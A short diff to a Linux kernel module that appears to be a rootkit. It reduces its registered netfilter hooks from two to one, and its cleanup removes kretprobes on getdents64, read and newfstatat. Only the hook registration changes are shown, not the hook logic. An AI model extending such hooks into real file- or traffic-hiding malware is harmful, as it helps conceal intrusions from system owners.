@@ -370,7 +370,8 @@ static unsigned int netfilter_arp_hook_func(void * priv, struct sk_buff * skb, c
 
 
 
-static struct nf_hook_ops net_hooks[2] = {
+static const int net_hook_count = 1;
+static struct nf_hook_ops net_hooks[] = {
     {
         .hook = netfilter_ip_hook_func,
         .hooknum = NF_INET_PRE_ROUTING,
@@ -418,7 +419,7 @@ static int __init entrypoint(void)
         return -1;
     }
 
-    if(nf_register_net_hooks(&init_net, net_hooks, 2) < 0){
+    if(nf_register_net_hooks(&init_net, net_hooks, net_hook_count) < 0){
         pr_info("nf_register_net_hook failed\n");
         return -1;
     }
@@ -442,7 +443,7 @@ static void __exit cleanup(void){
     unregister_kretprobe(&getdents64_kret_probe);
     unregister_kretprobe(&read_kret_probe);
     unregister_kretprobe(&newfstatat_kret_probe);
-    nf_unregister_net_hooks(&init_net, net_hooks, 2);
+    nf_unregister_net_hooks(&init_net, net_hooks, net_hook_count);
 
     pr_info("Yarin Module cleanup\n");
 }
